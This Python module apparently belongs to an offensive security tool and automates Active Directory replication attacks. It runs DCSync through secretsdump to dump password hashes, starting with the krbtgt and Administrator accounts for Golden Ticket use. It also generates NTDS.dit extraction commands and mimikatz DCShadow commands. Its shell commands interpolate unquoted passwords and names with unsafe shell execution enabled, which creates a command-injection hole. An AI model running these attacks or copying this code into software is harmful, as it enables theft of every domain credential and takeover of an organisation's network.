"""
AD Replication Attacks Module

Extended AD replication attack techniques:
- DCSync via DRSUAPI RPC
- DCSync via LDAP replication
- DCShadow attack (rogue DC)
- Replication metadata abuse
- NTDS.dit extraction alternatives

MITRE ATT&CK:
- T1003.006: OS Credential Dumping: DCSync
- T1207: Rogue Domain Controller
- T1003.003: OS Credential Dumping: NTDS

References:
- https://attack.mitre.org/techniques/T1003/006/
- https://adsecurity.org/?p=1729
- https://www.dcshadow.com/
"""

import time
import struct
import socket
import asyncio
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field

from ....proto import DirectoryType, ScanOptions
from utils.async_subprocess import run_shell


# =============================================================================
# Replication Attack Techniques
# =============================================================================

REPLICATION_TECHNIQUES = {
    "dcsync_drsuapi": {
        "name": "DCSync via DRSUAPI",
        "description": "Replicate credentials using Directory Replication Service RPC",
        "mitre": "T1003.006",
        "required_rights": ["DS-Replication-Get-Changes", "DS-Replication-Get-Changes-All"],
        "tools": ["secretsdump.py", "mimikatz"],
        "detection": {
            "event_ids": [4662],
            "guid": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        },
    },
    "dcsync_ldap": {
        "name": "DCSync via LDAP",
        "description": "Alternative replication using LDAP extended operations",
        "mitre": "T1003.006",
        "required_rights": ["DS-Replication-Get-Changes"],
        "detection": {
            "event_ids": [4662],
        },
    },
    "dcshadow": {
        "name": "DCShadow Attack",
        "description": "Register rogue DC to push malicious changes",
        "mitre": "T1207",
        "required_rights": ["Domain Admin or equivalent"],
        "tools": ["mimikatz"],
        "dangerous": True,
        "detection": {
            "indicators": ["New DC registration", "nTDSDSA object creation"],
        },
    },
    "ntds_extraction": {
        "name": "NTDS.dit Extraction",
        "description": "Extract NTDS.dit database file directly",
        "mitre": "T1003.003",
        "methods": ["VSS Shadow Copy", "ntdsutil", "diskshadow", "esentutl"],
        "detection": {
            "event_ids": [4688],
            "processes": ["ntdsutil.exe", "diskshadow.exe", "vssadmin.exe"],
        },
    },
    "replication_metadata": {
        "name": "Replication Metadata Abuse",
        "description": "Abuse replication metadata for persistence",
        "mitre": "T1003.006",
        "targets": ["replPropertyMetaData", "msDS-ReplAttributeMetaData"],
    },
}


# =============================================================================
# Required GUIDs for Replication Rights
# =============================================================================

REPLICATION_GUIDS = {
    "DS-Replication-Get-Changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "DS-Replication-Get-Changes-All": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "DS-Replication-Get-Changes-In-Filtered-Set": "89e95b76-444d-4c62-991a-0facbeda640c",
    "DS-Replication-Manage-Topology": "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2",
    "DS-Replication-Monitor-Topology": "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96",
    "DS-Replication-Synchronize": "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2",
}


# =============================================================================
# High-Value Targets for DCSync
# =============================================================================

HIGH_VALUE_TARGETS = {
    "krbtgt": {
        "description": "Kerberos TGT service account - enables Golden Ticket",
        "priority": "critical",
    },
    "Administrator": {
        "description": "Domain Administrator account",
        "priority": "critical",
    },
    "AZUREADSSOACC$": {
        "description": "Azure AD SSO computer account - enables Silver Ticket for Azure",
        "priority": "high",
    },
    "MSOL_*": {
        "description": "Azure AD Connect sync account",
        "priority": "high",
    },
    "svc_*": {
        "description": "Service accounts - often have elevated privileges",
        "priority": "medium",
    },
    "sql_*": {
        "description": "SQL Server service accounts",
        "priority": "medium",
    },
}


@dataclass
class ReplicationResult:
    """Result of replication attack."""
    technique: str
    success: bool
    credentials: List[Dict[str, Any]] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    execution_time: float = 0.0
    detection_artifacts: Dict[str, Any] = field(default_factory=dict)


class ReplicationAttacks:
    """Extended AD replication attack techniques."""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check_replication_rights(
        self,
        scan_options: ScanOptions,
    ) -> Dict[str, Any]:
        """
        Check if current user has replication rights.
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            Dict with replication rights check results
        """
        result = {
            "has_replication_rights": False,
            "rights": [],
            "vulnerable_principals": [],
            "errors": [],
        }
        
        if not scan_options.domain_name or not scan_options.username:
            result["errors"].append("Domain name and username required")
            return result
        
        try:
            # Check ACLs on domain root for replication rights
            ldapsearch_cmd = [
                "ldapsearch", "-x",
                "-H", f"ldap://{scan_options.ldap_server or scan_options.domain_name}",
                "-D", f"{scan_options.username}@{scan_options.domain_name}",
                "-w", scan_options.password or "",
                "-b", f"DC={',DC='.join(scan_options.domain_name.split('.'))}",
                "-s", "base",
                "(objectClass=*)",
                "nTSecurityDescriptor"
            ]
            
            if scan_options.ntlm_hash:
                # Use impacket for hash auth
                ldapsearch_cmd = self._build_impacket_cmd(scan_options, "getObjectAcl", [
                    f"-dc-ip {scan_options.domain_controller or scan_options.ldap_server}",
                ])
            
            cmd = " ".join(ldapsearch_cmd) if isinstance(ldapsearch_cmd, list) else str(ldapsearch_cmd)
            rc, out, err = await run_shell(cmd, timeout=60, allow_unsafe_shell=True)
            
            # NOTE: ldapsearch_cmd may be either a list of args or a string command.
            # We run it through the shell path to preserve existing quoting/flags behavior.
            # (Most of these commands are best-effort checks, not strict parsing.)
            # If you want to harden further, we can refactor _build_impacket_cmd to return args.
            # For now, keep behavior while avoiding blocking the event loop.
            # Replaced below by async runner.
            
            # Check for replication rights in output
            for guid_name, guid_value in REPLICATION_GUIDS.items():
                if guid_value.lower() in (out or "").lower():
                    result["rights"].append(guid_name)
            
            if "DS-Replication-Get-Changes" in result["rights"] and \
               "DS-Replication-Get-Changes-All" in result["rights"]:
                result["has_replication_rights"] = True
            
            # Find other principals with replication rights
            result["vulnerable_principals"] = await self._find_principals_with_replication_rights(scan_options)
            
        except Exception as e:
            result["errors"].append(f"Error checking replication rights: {str(e)}")
        
        return result
    
    async def dcsync_drsuapi(
        self,
        scan_options: ScanOptions,
        target_user: str = None,
        all_users: bool = False,
    ) -> ReplicationResult:
        """
        Execute DCSync attack via DRSUAPI RPC.
        
        Args:
            scan_options: Scan parameters
            target_user: Specific user to dump (e.g., krbtgt)
            all_users: Dump all users
            
        Returns:
            ReplicationResult with credentials
        """
        result = ReplicationResult(technique="dcsync_drsuapi")
        start_time = time.time()
        
        try:
            cmd_parts = ["secretsdump.py"]
            
            # Build authentication
            if scan_options.ntlm_hash:
                auth = f"{scan_options.domain_name}/{scan_options.username}@{scan_options.domain_controller or scan_options.ldap_server} -hashes :{scan_options.ntlm_hash}"
            else:
                auth = f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}@{scan_options.domain_controller or scan_options.ldap_server}"
            
            cmd_parts.append(auth)
            
            if target_user:
                cmd_parts.append(f"-just-dc-user {target_user}")
            elif all_users:
                cmd_parts.append("-just-dc")
            else:
                # Default: dump high-value targets
                cmd_parts.append("-just-dc-user krbtgt")
            
            cmd_parts.append("-outputfile -")
            
            rc, out, err = await run_shell(" ".join(cmd_parts), timeout=600, allow_unsafe_shell=True)
            
            if rc == 0:
                result.success = True
                result.credentials = self._parse_secretsdump_output(out or "")
            else:
                result.errors.append(f"DCSync failed: {err}")
            
            # Record detection artifacts
            result.detection_artifacts = {
                "event_ids": [4662],
                "guid_accessed": REPLICATION_GUIDS["DS-Replication-Get-Changes-All"],
                "target_dc": scan_options.domain_controller or scan_options.ldap_server,
            }
            
        except asyncio.TimeoutError:
            result.errors.append("DCSync timed out")
        except Exception as e:
            result.errors.append(f"Error: {str(e)}")
        
        result.execution_time = time.time() - start_time
        return result
    
    async def dcsync_ldap(
        self,
        scan_options: ScanOptions,
        target_dn: str = None,
    ) -> ReplicationResult:
        """
        Execute DCSync-like operation via LDAP extended operations.
        
        Args:
            scan_options: Scan parameters
            target_dn: Target distinguished name
            
        Returns:
            ReplicationResult with results
        """
        result = ReplicationResult(technique="dcsync_ldap")
        start_time = time.time()
        
        try:
            # LDAP replication is less common, mostly used for enumeration
            # This demonstrates the technique - actual implementation requires
            # specific LDAP libraries with extended operation support
            
            cmd = f"""ldapsearch -x -H ldap://{scan_options.ldap_server or scan_options.domain_name} \
                -D "{scan_options.username}@{scan_options.domain_name}" \
                -w "{scan_options.password}" \
                -b "CN=Schema,CN=Configuration,DC={',DC='.join(scan_options.domain_name.split('.'))}" \
                -s base "(objectClass=*)" \
                replPropertyMetaData msDS-ReplAttributeMetaData"""
            
            rc, _, err = await run_shell(cmd, timeout=60, allow_unsafe_shell=True)
            
            if rc == 0:
                result.success = True
                result.detection_artifacts = {
                    "method": "LDAP extended operation",
                    "attributes_accessed": ["replPropertyMetaData", "msDS-ReplAttributeMetaData"],
                }
            else:
                result.errors.append(f"LDAP query failed: {err}")
                
        except Exception as e:
            result.errors.append(f"Error: {str(e)}")
        
        result.execution_time = time.time() - start_time
        return result
    
    async def dcshadow_check(
        self,
        scan_options: ScanOptions,
    ) -> Dict[str, Any]:
        """
        Check prerequisites for DCShadow attack (does not execute).
        
        DCShadow is DANGEROUS and modifies AD. This only checks prerequisites.
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            Dict with DCShadow prerequisites check
        """
        result = {
            "dcshadow_possible": False,
            "prerequisites": {
                "domain_admin": False,
                "schema_admin": False,
                "computer_account_control": False,
            },
            "risks": [
                "DCShadow MODIFIES Active Directory",
                "Creates rogue DC registration",
                "Highly detectable",
                "Can cause replication issues",
            ],
            "exploitation_command": "",
            "errors": [],
        }
        
        try:
            # Check if user is Domain Admin
            whoami_cmd = f"""ldapsearch -x -H ldap://{scan_options.ldap_server or scan_options.domain_name} \
                -D "{scan_options.username}@{scan_options.domain_name}" \
                -w "{scan_options.password}" \
                -b "CN=Domain Admins,CN=Users,DC={',DC='.join(scan_options.domain_name.split('.'))}" \
                "(member=*)" member"""
            
            _, whoami_out, _ = await run_shell(whoami_cmd, timeout=30, allow_unsafe_shell=True)
            
            if scan_options.username.lower() in (whoami_out or "").lower():
                result["prerequisites"]["domain_admin"] = True
            
            # Check for Schema Admin (needed for some DCShadow operations)
            schema_cmd = f"""ldapsearch -x -H ldap://{scan_options.ldap_server or scan_options.domain_name} \
                -D "{scan_options.username}@{scan_options.domain_name}" \
                -w "{scan_options.password}" \
                -b "CN=Schema Admins,CN=Users,DC={',DC='.join(scan_options.domain_name.split('.'))}" \
                "(member=*)" member"""
            
            _, schema_out, _ = await run_shell(schema_cmd, timeout=30, allow_unsafe_shell=True)
            
            if scan_options.username.lower() in (schema_out or "").lower():
                result["prerequisites"]["schema_admin"] = True
            
            if result["prerequisites"]["domain_admin"]:
                result["dcshadow_possible"] = True
                result["exploitation_command"] = f"""# DCShadow attack (DANGEROUS - MODIFIES AD)
# Step 1: Start DCShadow server (on attacker machine)
mimikatz # lsadump::dcshadow /object:CN=targetuser,CN=Users,DC={',DC='.join(scan_options.domain_name.split('.'))} /attribute:ntPwdHistory /value:<hash>

# Step 2: Push changes (requires DA on separate session)
mimikatz # lsadump::dcshadow /push

# This creates a temporary rogue DC and pushes malicious changes
# USE WITH EXTREME CAUTION"""
            
        except Exception as e:
            result["errors"].append(f"Error checking DCShadow prerequisites: {str(e)}")
        
        return result
    
    async def ntds_extraction_methods(
        self,
        scan_options: ScanOptions,
    ) -> Dict[str, Any]:
        """
        Generate NTDS.dit extraction commands (does not execute).
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            Dict with extraction methods
        """
        domain_parts = scan_options.domain_name.split('.') if scan_options.domain_name else ['domain', 'local']
        
        return {
            "methods": {
                "vss_shadow_copy": {
                    "description": "Volume Shadow Copy method",
                    "commands": [
                        "# Create shadow copy",
                        "vssadmin create shadow /for=C:",
                        "",
                        "# Copy NTDS.dit",
                        r"copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit",
                        "",
                        "# Copy SYSTEM hive (for decryption key)",
                        r"copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM",
                        "",
                        "# Extract with secretsdump",
                        "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
                    ],
                    "requires": "Local Admin on DC",
                },
                "ntdsutil": {
                    "description": "ntdsutil IFM (Install From Media) method",
                    "commands": [
                        'ntdsutil "activate instance ntds" "ifm" "create full C:\\ntdsutil_extract" quit quit',
                        "",
                        "# Files will be in C:\\ntdsutil_extract\\Active Directory\\",
                        "secretsdump.py -ntds 'ntds.dit' -system 'registry/SYSTEM' LOCAL",
                    ],
                    "requires": "Domain Admin",
                },
                "diskshadow": {
                    "description": "diskshadow scripted method",
                    "commands": [
                        "# Create script: shadow.txt",
                        "set context persistent nowriters",
                        "add volume c: alias someAlias",
                        "create",
                        "expose %someAlias% z:",
                        "",
                        "# Execute",
                        "diskshadow /s shadow.txt",
                        "",
                        "# Copy files",
                        "copy z:\\Windows\\NTDS\\ntds.dit C:\\ntds.dit",
                        "copy z:\\Windows\\System32\\config\\SYSTEM C:\\SYSTEM",
                    ],
                    "requires": "Local Admin on DC",
                },
                "esentutl": {
                    "description": "esentutl direct copy method",
                    "commands": [
                        "# Copy locked NTDS.dit",
                        "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\ntds.dit",
                        "",
                        "# Copy SYSTEM hive",
                        "reg save HKLM\\SYSTEM C:\\SYSTEM",
                    ],
                    "requires": "Local Admin on DC",
                },
                "wmic_shadowcopy": {
                    "description": "WMIC shadow copy method",
                    "commands": [
                        "# Create shadow copy",
                        "wmic shadowcopy call create Volume='C:\\'",
                        "",
                        "# Get shadow copy path",
                        "wmic shadowcopy list brief",
                        "",
                        "# Copy files using shadow copy path",
                    ],
                    "requires": "Local Admin on DC",
                },
                "secretsdump_remote": {
                    "description": "Remote extraction via secretsdump",
                    "commands": [
                        f"# Direct remote dump (uses VSS internally)",
                        f"secretsdump.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password or 'PASSWORD'}@{scan_options.domain_controller or 'DC'} -just-dc",
                    ],
                    "requires": "Domain Admin or Replication Rights",
                },
            },
            "detection": {
                "event_ids": [4688, 4104, 7036],
                "processes": ["ntdsutil.exe", "diskshadow.exe", "vssadmin.exe", "esentutl.exe"],
                "file_access": ["ntds.dit", "SYSTEM"],
            },
        }
    
    async def dump_high_value_targets(
        self,
        scan_options: ScanOptions,
    ) -> ReplicationResult:
        """
        Dump credentials for high-value targets using DCSync.
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            ReplicationResult with high-value credentials
        """
        result = ReplicationResult(technique="high_value_dcsync")
        start_time = time.time()
        all_credentials = []
        
        # Always dump krbtgt first (for Golden Ticket)
        priority_targets = ["krbtgt", "Administrator"]
        
        for target in priority_targets:
            target_result = await self.dcsync_drsuapi(scan_options, target_user=target)
            
            if target_result.success:
                for cred in target_result.credentials:
                    cred["priority"] = HIGH_VALUE_TARGETS.get(target, {}).get("priority", "medium")
                    cred["usage"] = HIGH_VALUE_TARGETS.get(target, {}).get("description", "")
                    all_credentials.append(cred)
        
        # Try to find Azure AD related accounts
        azure_targets = ["AZUREADSSOACC$"]
        for target in azure_targets:
            target_result = await self.dcsync_drsuapi(scan_options, target_user=target)
            if target_result.success:
                for cred in target_result.credentials:
                    cred["priority"] = "high"
                    cred["usage"] = "Azure AD SSO account - enables Silver Ticket for Azure services"
                    all_credentials.append(cred)
        
        result.credentials = all_credentials
        result.success = len(all_credentials) > 0
        result.execution_time = time.time() - start_time
        
        return result
    
    async def _find_principals_with_replication_rights(
        self,
        scan_options: ScanOptions,
    ) -> List[Dict[str, Any]]:
        """Find all principals with replication rights."""
        principals = []
        
        try:
            # This would require parsing ACLs from the domain root
            # Simplified check using ldapsearch
            cmd = f"""ldapsearch -x -H ldap://{scan_options.ldap_server or scan_options.domain_name} \
                -D "{scan_options.username}@{scan_options.domain_name}" \
                -w "{scan_options.password}" \
                -b "DC={',DC='.join(scan_options.domain_name.split('.'))}" \
                -s base "(objectClass=*)" \
                nTSecurityDescriptor"""
            
            # In practice, you'd parse the security descriptor
            # For now, return known default principals
            principals = [
                {"name": "Domain Admins", "type": "group", "default": True},
                {"name": "Enterprise Admins", "type": "group", "default": True},
                {"name": "Domain Controllers", "type": "group", "default": True},
            ]
            
        except Exception:
            pass
        
        return principals
    
    def _build_impacket_cmd(
        self,
        scan_options: ScanOptions,
        tool: str,
        args: List[str],
    ) -> str:
        """Build impacket command with authentication."""
        if scan_options.ntlm_hash:
            auth = f"{scan_options.domain_name}/{scan_options.username} -hashes :{scan_options.ntlm_hash}"
        else:
            auth = f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}"
        
        return f"{tool}.py {auth} {' '.join(args)}"
    
    def _parse_secretsdump_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse secretsdump output to extract credentials."""
        credentials = []
        
        for line in output.strip().split("\n"):
            if ":::" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    username = parts[0].strip()
                    rid = parts[1].strip() if len(parts) > 1 else None
                    lm_hash = parts[2].strip() if len(parts) > 2 else None
                    nt_hash = parts[3].strip() if len(parts) > 3 else None
                    
                    # Skip empty hashes
                    if nt_hash and nt_hash != "aad3b435b51404eeaad3b435b51404ee":
                        credentials.append({
                            "username": username,
                            "rid": rid,
                            "lm_hash": lm_hash,
                            "nt_hash": nt_hash,
                        })
        
        return credentials
    
    async def generate_exploitation_report(
        self,
        scan_options: ScanOptions,
    ) -> Dict[str, Any]:
        """
        Generate comprehensive replication attack report.
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            Dict with full attack report
        """
        report = {
            "replication_rights_check": {},
            "dcshadow_check": {},
            "ntds_methods": {},
            "recommendations": [],
        }
        
        # Check replication rights
        report["replication_rights_check"] = await self.check_replication_rights(scan_options)
        
        # Check DCShadow prerequisites
        report["dcshadow_check"] = await self.dcshadow_check(scan_options)
        
        # Get NTDS extraction methods
        report["ntds_methods"] = await self.ntds_extraction_methods(scan_options)
        
        # Generate recommendations
        if report["replication_rights_check"].get("has_replication_rights"):
            report["recommendations"].append({
                "priority": "critical",
                "action": "DCSync attack possible",
                "command": f"secretsdump.py {scan_options.domain_name}/{scan_options.username}@{scan_options.domain_controller} -just-dc",
            })
        
        if report["replication_rights_check"].get("vulnerable_principals"):
            report["recommendations"].append({
                "priority": "high",
                "action": "Review principals with replication rights",
                "principals": report["replication_rights_check"]["vulnerable_principals"],
            })
        
        return report

